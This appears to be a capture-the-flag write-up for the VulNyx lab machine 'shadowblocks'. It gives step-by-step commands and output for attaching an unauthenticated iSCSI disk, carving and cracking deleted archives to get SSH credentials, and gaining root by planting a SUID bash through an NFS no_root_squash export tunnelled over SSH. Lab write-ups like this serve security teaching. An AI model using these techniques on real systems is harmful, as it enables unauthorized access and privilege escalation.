# shadowblocks

## Executive Summary

| Machine | OS | Author | Category | Platform |
| :--- | :--- | :--- | :--- | :--- |
| shadowblocks | Linux | Lenam | Easy | VulNyx |

**Summary:** The shadowblocks machine exposes OpenSSH 10.0p2 on port 22 and an iSCSI target on port 3260 that answers with a `Synology DSM iSCSI` banner. Nmap service detection disclosed the logical unit `iqn.2026-02.nyx.shadowblocks:storage.disk1` with authentication disabled, so the target was attached locally with `iscsiadm` and its single partition was mounted read only. The mounted volume revealed a corporate directory structure whose plaintext documents contained nothing sensitive, which prompted a byte level image of the device and a carving pass with PhotoRec that recovered two deleted 7z archives absent from the live filesystem. Extracting the archive hashes with `7z2john` and attacking them with john against the rockyou wordlist cracked one archive using the password `donald`, revealing a credentials file that held the password `3vEbN3bM6NhOa1640weG` for the user `lenam` and granted an SSH foothold on the machine. Post exploitation enumeration surfaced a SUID `mount.nfs` binary, an `/etc/exports` entry publishing `/srv/nfs` to every client with the `no_root_squash` option, and NFS listening on port 2049 even though the external port scan had never reported the service as reachable. An SSH local port forward carried the NFS service to the attacker host, where a root owned mount of the export allowed a copy of the target bash binary, planted with the SUID and SGID bits, to land on the target as root. Executing `/srv/nfs/exploit -p` produced a shell with an effective uid of zero, and a Python `setuid` call converted it into a complete root session that exposed both flags.

---

## Reconnaissance

The engagement commenced on the VirtualBox host only subnet `192.168.56.0/24`, with the attacker machine operating from `192.168.56.1` and the target awaiting discovery somewhere in that range.

1. An initial ARP ping sweep located the active hosts on the subnet, identifying the target machine at `192.168.56.205`:

```zsh
❯ sudo nmap -sn -PR 192.168.56.0/24
Starting Nmap 7.991 ( https://nmap.org ) at 2026-09-21 12:56 +0700
Nmap scan report for 192.168.56.100
Host is up (0.0059s latency).
MAC Address: 08:00:27:90:8A:8E (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.205
Host is up (0.00061s latency).
MAC Address: 08:00:27:31:D2:71 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.1
Host is up.
Nmap done: 256 IP addresses (3 hosts up) scanned in 4.94 seconds
```

The sweep found two VirtualBox guests besides the attacker host, and the address `192.168.56.205` was taken as the target for the remainder of the assessment.

2. The target address was stored in a shell variable and subjected to a full TCP port scan across all 65535 ports:

```zsh
❯ ip=192.168.56.205
```

```zsh
❯ nmap -p- -Pn $ip
Starting Nmap 7.991 ( https://nmap.org ) at 2026-09-21 13:00 +0700
Nmap scan report for 192.168.56.205
Host is up (0.0012s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
3260/tcp open  iscsi

Nmap done: 1 IP address (1 host up) scanned in 107.19 seconds
```

Only two TCP services were exposed, SSH on port 22 and iSCSI on port 3260. The absence of any web server ruled out content discovery entirely and made the unusual storage service the obvious point of interest.

3. Service and version detection with default NSE scripts was run against both open ports:

```zsh
❯ nmap -p 22,3260 -Pn -sCV -T4 --min-rate 5000 $ip
Starting Nmap 7.991 ( https://nmap.org ) at 2026-09-21 13:02 +0700
Nmap scan report for 192.168.56.205
Host is up (0.0020s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 10.0p2 Debian 7 (protocol 2.0)
3260/tcp open  iscsi   Synology DSM iSCSI
| iscsi-info:
|   iqn.2026-02.nyx.shadowblocks:storage.disk1:
|     Address: 192.168.56.205:3260,1
|_    Authentication: NOT required
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 99.65 seconds
```

Version detection fingerprinted OpenSSH 10.0p2 running on Debian and an iSCSI target answering with a `Synology DSM iSCSI` banner. Critically, the `iscsi-info` script reported the exported target `iqn.2026-02.nyx.shadowblocks:storage.disk1` and stated that authentication was not required, flagging the LUN as an unauthenticated data exposure.

4. A quick TCP reachability check confirmed that the iSCSI service answered normally before interacting with it further:

```zsh
❯ nc -zv $ip 3260
Connection to 192.168.56.205 3260 port [tcp/iscsi-target] succeeded!
```

---

## Initial Access

### Unauthenticated iSCSI Target Discovery and LUN Attachment

5. With the IQN already disclosed by nmap, a SendTargets discovery request was issued through `iscsiadm` to enumerate the portal serving the target:

```zsh
❯ sudo iscsiadm -m discovery -t sendtargets -p $ip:3260

192.168.56.205:3260,1 iqn.2026-02.nyx.shadowblocks:storage.disk1
```

The discovery request confirmed the portal `192.168.56.205:3260,1` and returned the single target `iqn.2026-02.nyx.shadowblocks:storage.disk1` seen during reconnaissance.

6. The target was then logged into with `iscsiadm`, instructing the kernel to attach the exported LUN as a local block device:

```zsh
❯ sudo iscsiadm -m node -T iqn.2026-02.nyx.shadowblocks:storage.disk1 -p $ip:3260 --login

Login to [iface: default, target: iqn.2026-02.nyx.shadowblocks:storage.disk1, portal: 192.168.56.205,3260] successful.
```

The login succeeded without any challenge, and the storage exported by the remote target was now available to the attacker machine as a native disk.

### Mounting the Attached LUN and Initial Filesystem Triage

7. Listing the block devices confirmed that the iSCSI session had materialized a new disk:

```zsh
❯ lsblk
NAME   MAJ:MIN RM   SIZE RO TYPE MOUNTPOINTS
sda      8:0    0 238.5G  0 disk
├─sda1   8:1    0     1G  0 part /boot
└─sda2   8:2    0 237.5G  0 part /var/cache/pacman/pkg
                                 /var/log
                                 /home
                                 /
sdb      8:16   1     0B  0 disk
sdc      8:32   0   150M  1 disk
└─sdc1   8:33   0   149M  1 part
zram0  253:0    0   3.7G  0 disk [SWAP]
```

The newly attached LUN appeared as `/dev/sdc`, a 150M read only device holding a single 149M partition `/dev/sdc1`, clearly distinguishable from the attacker's own 238.5G disk `sda` and the empty removable device `sdb`.

8. The partition was mounted read only into a working directory and its top level contents were listed:

```zsh
❯ mkdir ./target_iscsi

❯ sudo mount -o ro /dev/sdc1 ./target_iscsi

❯ ls -la ./target_iscsi
total 20500
drwxr-xr-x 10 root          root              1024 Mar  1  2026 .
drwxr-xr-x  1 setyanoegraha setyanoegraha       88 Sep 21 13:16 ..
drwxrwxr-x  2 root          root              1024 Mar  1  2026 backups
drwxrwxr-x  2 root          root              1024 Mar  1  2026 configs
drwxrwxr-x  2 root          root              1024 Mar  1  2026 docs
drwxrwxr-x  2 root          root              1024 Mar  1  2026 engineering
drwxrwxr-x  2 root          root              1024 Mar  1  2026 finance
drwxrwxr-x  2 root          root              1024 Mar  1  2026 hr
drwxrwxr-x  2 root          root              1024 Mar  1  2026 logs
drwx------  2 root          root             12288 Mar  1  2026 lost+found
-rw-rw-r--  1 root          root          20971520 Mar  1  2026 random_fill.bin
```

The volume presented a small corporate filesystem with `backups`, `configs`, `docs`, `engineering`, `finance`, `hr`, and `logs` directories alongside a 20 MB file named `random_fill.bin`, resembling the storage node of a small company.

9. From inside the mount point, every regular file except the large binary fill file was inventoried, and a recursive grep sweep searched the whole tree for credential related keywords:

```zsh
❯ find . -type f -not -name random_fill.bin -exec ls -la {} \;
-rw-rw-r-- 1 root root 274 Mar  1  2026 ./hr/employees.txt
-rw-rw-r-- 1 root root 434 Mar  1  2026 ./engineering/infrastructure_notes.txt
-rw-rw-r-- 1 root root 399 Mar  1  2026 ./docs/company_overview.txt
-rw-rw-r-- 1 root root 15728640 Mar  1  2026 ./backups/backup_january_2026.bak
-rw-rw-r-- 1 root root 10485760 Mar  1  2026 ./backups/backup_february_2026.bak
-rw-rw-r-- 1 root root 402 Mar  1  2026 ./logs/system.log
-rw-rw-r-- 1 root root 358 Mar  1  2026 ./finance/budget_2026.txt
find: ‘./lost+found’: Permission denied
-rw-rw-r-- 1 root root 282 Mar  1  2026 ./configs/storage.conf

❯ grep -rEi "pass|user|key|ssh|token" . --include="*" -l 2>/dev/null
./backups/backup_january_2026.bak
./backups/backup_february_2026.bak
./random_fill.bin
```

The plaintext documents turned out to be benign corporate artifacts, and the keyword sweep only matched the large binary backup archives and the fill file, none of which offered anything usable. Since roughly 45 MB of the 150 MB device was accounted for by the visible files, deleted artifacts became the most promising source of sensitive data.

### Deleted Artifact Carving with PhotoRec

10. To preserve a working copy for forensic analysis, the entire device was imaged with `dd`:

```zsh
❯ sudo dd if=/dev/sdc of=./iscsi_full.img bs=4096 status=progress
38400+0 records in
38400+0 records out
157286400 bytes (157 MB, 150 MiB) copied, 0.436515 s, 360 MB/s
```

The 150 MiB image copy completed almost instantly, providing a stable artifact from which deleted data could be recovered.

11. PhotoRec was then launched against the block device itself:

```zsh
❯ sudo photorec /dev/sdc
```

Inside the interactive interface the operator selected Proceed, then Search, chose the ext2/ext3 filesystem profile, accepted the Whole option, pointed the recovery output at a local directory, and quit once the carving pass finished.

12. Listing the first recovery directory revealed what the carving pass had rescued:

```zsh
❯ ls -la target_iscsi/recup_dir.1
total 44
drwxr-xr-x 1 root          root            208 Sep 22 06:30 .
drwxr-xr-x 1 setyanoegraha setyanoegraha    22 Sep 22 06:30 ..
-rw-r--r-- 1 root          root            480 Sep 22 06:30 f0018434.7z
-rw-r--r-- 1 root          root            399 Sep 22 06:30 f0018436.txt
-rw-r--r-- 1 root          root            358 Sep 22 06:30 f0018438.txt
-rw-r--r-- 1 root          root            434 Sep 22 06:30 f0018440.txt
-rw-r--r-- 1 root          root            274 Sep 22 06:30 f0018442.txt
-rw-r--r-- 1 root          root            402 Sep 22 06:30 f0018444.txt
-rw-r--r-- 1 root          root            282 Sep 22 06:30 f0018446.txt
-rw-r--r-- 1 root          root            480 Sep 22 06:30 f0018448.7z
-rw-r--r-- 1 root          root          10010 Sep 22 06:30 report.xml
```

The recovered text files mirrored the plaintext documents already visible on the mounted filesystem, judging by their matching sizes, but the two 480 byte 7z archives had no counterpart anywhere in the live tree, marking them as deleted artifacts that only survived in unallocated space.

13. The `file` utility confirmed the nature of both recovered archives:

```zsh
❯ file f0018434.7z f0018448.7z
f0018434.7z: 7-zip archive data, version 0.4
f0018448.7z: 7-zip archive data, version 0.4
```

Both files were genuine 7z archives, promising encrypted containers for data that had been deliberately removed from the storage node.

### Archive Cracking and the SSH Foothold

14. The password hashes of both archives were extracted with `7z2john` into two hash files:

```zsh
❯ 7z2john f0018434.7z > /tmp/hash1

❯ 7z2john f0018448.7z > /tmp/hash2
```

15. John the Ripper attacked both hashes with the rockyou wordlist:

```zsh
❯ john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt /tmp/hash1 2>/dev/null
Loaded 1 password hash (7z, 7-Zip [SHA256 128/128 AVX 4x AES])
Cost 1 (iteration count) is 524288 for all loaded hashes
Cost 2 (padding size) is 6 for all loaded hashes
Cost 3 (compression type) is 0 for all loaded hashes
donald           (f0018434.7z)

❯ john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt /tmp/hash2 2>/dev/null
Loaded 1 password hash (7z, 7-Zip [SHA256 128/128 AVX 4x AES])
No password hashes left to crack (see FAQ)
```

The first archive fell to the dictionary attack with the password `donald`. The second invocation reported that no password hashes were left to crack, an indication that this hash had already been resolved and recorded in john's pot file, so the extraction proceeded with `f0018434.7z`.

16. The cracked archive was extracted with the recovered password and the released file was displayed:

```zsh
❯ 7z x f0018434.7z -pdonald -o/tmp/

7-Zip 26.03 (x64) : Copyright (c) 1999-2026 Igor Pavlov : 2026-09-03
 64-bit locale=en_US.UTF-8 Threads:4 OPEN_MAX:4096, ASM

Scanning the drive for archives:
1 file, 480 bytes (1 KiB)

Extracting archive: f0018434.7z
--
Path = f0018434.7z
Type = 7z
Physical Size = 480
Headers Size = 208
Method = LZMA2:12 7zAES
Solid = -
Blocks = 1

Everything is Ok

Size:       338
Compressed: 480

❯ cat /tmp/credentials.txt
ShadowBlocks Internal Access Credentials
=======================================

System: Primary Storage Node
Environment: Production
Access Level: Administrative

Username: lenam
Password: 3vEbN3bM6NhOa1640weG

Note:
This file is intended for temporary migration procedures only.
It must be deleted after use.
Last reviewed: 2026-02-15
```

The archive released a `credentials.txt` file describing itself as the internal access credentials of ShadowBlocks, disclosing the username `lenam` with the password `3vEbN3bM6NhOa1640weG` for the primary storage node. Ironically, the note inside stated the file should have been deleted after use, which is precisely why it was only recoverable through carving.

17. The recovered credentials were replayed against the SSH service:

```zsh
❯ ssh lenam@$ip
lenam@192.168.56.205's password:
Linux shadowblocks 6.12.73+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.73-1 (2026-02-17) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Mar  1 17:17:49 2026 from 192.168.1.5
lenam@shadowblocks:~$ id;whoami;hostname
uid=1000(lenam) gid=1000(lenam) grupos=1000(lenam),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev)
lenam
shadowblocks
lenam@shadowblocks:~$ ls
user.txt
```

The password was accepted and an interactive shell was established as `lenam` on the host `shadowblocks`, with `user.txt` waiting in the home directory.

---

## Privilege Escalation

### SUID Enumeration and NFS Export Analysis

18. A filesystem wide search for binaries carrying the SUID bit was launched from the lenam session:

```zsh
lenam@shadowblocks:~$ find / -type f -perm -4000 -exec ls -la {} \; 2>/dev/null
-rwsr-xr-x 1 root root 146480 mar 31  2025 /usr/sbin/mount.nfs
-rwsr-xr-x 1 root root 494144 ago  1  2025 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 51272 mar  8  2025 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 84360 may 10  2025 /usr/bin/su
-rwsr-xr-x 1 root root 52936 abr 19  2025 /usr/bin/chsh
-rwsr-xr-x 1 root root 72072 may 10  2025 /usr/bin/mount
-rwsr-xr-x 1 root root 70888 abr 19  2025 /usr/bin/chfn
-rwsr-xr-x 1 root root 55688 may 10  2025 /usr/bin/umount
-rwsr-xr-x 1 root root 18816 may 10  2025 /usr/bin/newgrp
-rwsr-xr-x 1 root root 118168 abr 19  2025 /usr/bin/passwd
-rwsr-xr-x 1 root root 88568 abr 19  2025 /usr/bin/gpasswd
```

The list was dominated by standard utilities, but `/usr/sbin/mount.nfs` stood out as an unusual SUID entry, hinting that NFS would play a role in the escalation path.

19. The NFS server configuration was inspected next:

```zsh
lenam@shadowblocks:~$ cat /etc/exports
# /etc/exports: the access control list for filesystems which may be exported
#		to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/srv/nfs *(rw,sync,fsid=0,no_subtree_check,no_root_squash,insecure)
```

The single export line published `/srv/nfs` to every client with read and write access and critically carried the `no_root_squash` option, which preserves root privileges for clients mounting the share. The `insecure` option additionally permits connections originating from unprivileged client ports, exactly what an SSH tunnel would need.

20. A review of listening sockets established where the NFS service was actually reachable:

```zsh
lenam@shadowblocks:~$ ss -tulpn
Netid  State   Recv-Q  Send-Q                         Local Address:Port      Peer Address:Port  Process
udp    UNCONN  0       0                                    0.0.0.0:44156          0.0.0.0:*
udp    UNCONN  0       0                                    0.0.0.0:60643          0.0.0.0:*
udp    UNCONN  0       0                                    0.0.0.0:46600          0.0.0.0:*
udp    UNCONN  0       0                             192.168.56.205:68             0.0.0.0:*
udp    UNCONN  0       0                                    0.0.0.0:111            0.0.0.0:*
udp    UNCONN  0       0                                  127.0.0.1:900            0.0.0.0:*
udp    UNCONN  0       0                                       [::]:36701             [::]:*
udp    UNCONN  0       0                                       [::]:111               [::]:*
udp    UNCONN  0       0                                       [::]:43209             [::]:*
udp    UNCONN  0       0         [fe80::2343:902a:f23e:750e]%enp0s3:546               [::]:*
udp    UNCONN  0       0                                       [::]:58359             [::]:*
tcp    LISTEN  0       4096                                 0.0.0.0:59933          0.0.0.0:*
tcp    LISTEN  0       4096                                 0.0.0.0:2049           0.0.0.0:*
tcp    LISTEN  0       128                                  0.0.0.0:22             0.0.0.0:*
tcp    LISTEN  0       4096                                 0.0.0.0:43041          0.0.0.0:*
tcp    LISTEN  0       4096                                 0.0.0.0:111            0.0.0.0:*
tcp    LISTEN  0       4096                                 0.0.0.0:49131          0.0.0.0:*
tcp    LISTEN  0       256                                  0.0.0.0:3260           0.0.0.0:*
tcp    LISTEN  0       4096                                    [::]:47459             [::]:*
tcp    LISTEN  0       4096                                    [::]:2049              [::]:*
tcp    LISTEN  0       128                                     [::]:22                [::]:*
tcp    LISTEN  0       4096                                    [::]:111               [::]:*
tcp    LISTEN  0       4096                                    [::]:44633             [::]:*
tcp    LISTEN  0       4096                                    [::]:60573             [::]:*
```

The NFS daemon listened on port 2049 together with rpcbind on port 111, yet the full TCP port scan had only ever reported ports 22 and 3260, so the storage ports were filtered from the network despite being bound locally. An SSH tunnel would therefore be required to reach the export.

### SSH Tunneling and SUID Shell Planting through the Export

21. In a second terminal an SSH local port forward carried the target's NFS service to the attacker machine, while the original lenam session was kept alive:

```zsh
❯ sudo ssh -L 2049:127.0.0.1:2049 lenam@$ip
lenam@192.168.56.205's password:
...
lenam@shadowblocks:~$
```

The forward mapped port 2049 on the attacker host to port 2049 on the target through the authenticated SSH channel.

22. From a third terminal the forwarded service was mounted as an NFS version 4 share, and running the mount with sudo meant the client operated as root, an identity the `no_root_squash` export preserves on the server side:

```zsh
❯ mkdir -p /tmp/nfs

❯ sudo mount -t nfs -o vers=4,nolock 127.0.0.1:/ /tmp/nfs
[sudo] password for setyanoegraha:

❯ ls -la /tmp/nfs
total 4
drwxr-xr-x  2 root root 4096 Mar  1  2026 .
drwxrwxrwt 18 root root  480 Sep 22 06:56 ..
-rw-rw-r--  1 root root    0 Mar  1  2026 text.txt
```

The fsid 0 root export mounted successfully and revealed an empty `text.txt` file, confirming access to the share.

23. The escalation payload was prepared by copying the target's own bash binary over SSH, placing it into the mounted share, and enabling both SUID and SGID bits:

```zsh
❯ scp lenam@$ip:/bin/bash /tmp/bash_target
lenam@192.168.56.205's password:
bash                                                                    100% 1268KB  61.5MB/s   00:00

❯ sudo cp /tmp/bash_target /tmp/nfs/exploit

❯ sudo chown root:root /tmp/nfs/exploit

❯ sudo chmod +sx /tmp/nfs/exploit

❯ ls -la /tmp/nfs/exploit
-rwsr-sr-x 1 root root 1298416 Sep 22 07:02 /tmp/nfs/exploit
```

Because the mount ran as local root against an export configured with `no_root_squash`, the planted file landed on the target as `root:root` carrying the `rwsr-sr-x` permission mask.

24. Back in the original lenam session, the planted binary was verified on the server side:

```zsh
lenam@shadowblocks:~$ ls -la /srv/nfs/exploit
-rwsr-sr-x 1 root root 1298416 sep 22 02:02 /srv/nfs/exploit
```

The exploit binary was confirmed inside `/srv/nfs` on the target, owned by root and carrying both SUID and SGID bits.

25. The planted binary was executed with the `-p` flag, which makes bash preserve its effective identity instead of dropping privileges, followed by a short Python snippet that converted the effective root identity into a real one:

```zsh
lenam@shadowblocks:~$ /srv/nfs/exploit -p
exploit-5.2# python3 -c 'import os; os.setuid(0); os.setgid(0); os.setgroups([0]); os.system("/bin/bash")'
```

The `-p` flag spawned a bash process holding an effective uid of zero, reflected by the root style prompt, while the real uid remained `lenam`. The Python snippet called `setuid`, `setgid`, and `setgroups` to lock the process fully into the root identity.

26. Superuser privileges were verified and both flags were read:

```zsh
root@shadowblocks:~# id;whoami;hostname
uid=0(root) gid=0(root) grupos=0(root)
root
shadowblocks
root@shadowblocks:~# cat /home/lenam/user.txt /root/root.txt
c94...
402...
```

The `id` output confirmed uid 0, completing the compromise of the shadowblocks machine with both `user.txt` and `root.txt` retrieved.

---

## Attack Chain Summary

1. **Reconnaissance**: An ARP sweep located the target at `192.168.56.205`, and full TCP port scanning identified OpenSSH on port 22 and an iSCSI target on port 3260 fingerprinted as `Synology DSM iSCSI`.
2. **Vulnerability Discovery**: Nmap service detection disclosed the logical unit `iqn.2026-02.nyx.shadowblocks:storage.disk1` with authentication disabled, exposing the storage backend to unauthenticated attachment.
3. **Exploitation**: The LUN was attached with `iscsiadm` and mounted read only, and after plaintext triage found nothing sensitive, a PhotoRec carving pass recovered deleted 7z archives whose cracked hash revealed SSH credentials for `lenam`.
4. **Internal Enumeration**: SUID enumeration highlighted `mount.nfs`, and `/etc/exports` published `/srv/nfs` with `no_root_squash` while `ss` showed NFS listening on port 2049 although the port was unreachable from the network.
5. **Privilege Escalation**: An SSH tunnel carried the export to the attacker host, where a root owned mount planted an SUID bash copy that executed with effective root privileges, and a Python `setuid` call completed full root compromise, exposing both flags.
